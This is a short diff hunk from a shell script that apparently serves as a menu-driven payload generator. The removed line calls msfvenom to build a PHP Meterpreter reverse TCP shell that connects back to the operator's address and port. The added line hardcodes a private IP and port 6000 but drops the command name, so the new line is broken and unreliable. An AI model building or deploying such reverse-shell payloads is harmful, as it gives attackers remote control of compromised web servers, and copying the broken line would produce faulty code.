@@ -535,7 +535,7 @@ echo ""
 				spinlong2
 				echo ""
 				echo ""
-         			msfvenom -p php/meterpreter_reverse_tcp LHOST=$yourip LPORT=$yourport R > output/$fira.php
+         			php/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=6000 R > output/$fira.php 
           			echo -e "Shell Saved To output Folder "
 			elif test $fatrat1 == '6'
 				then
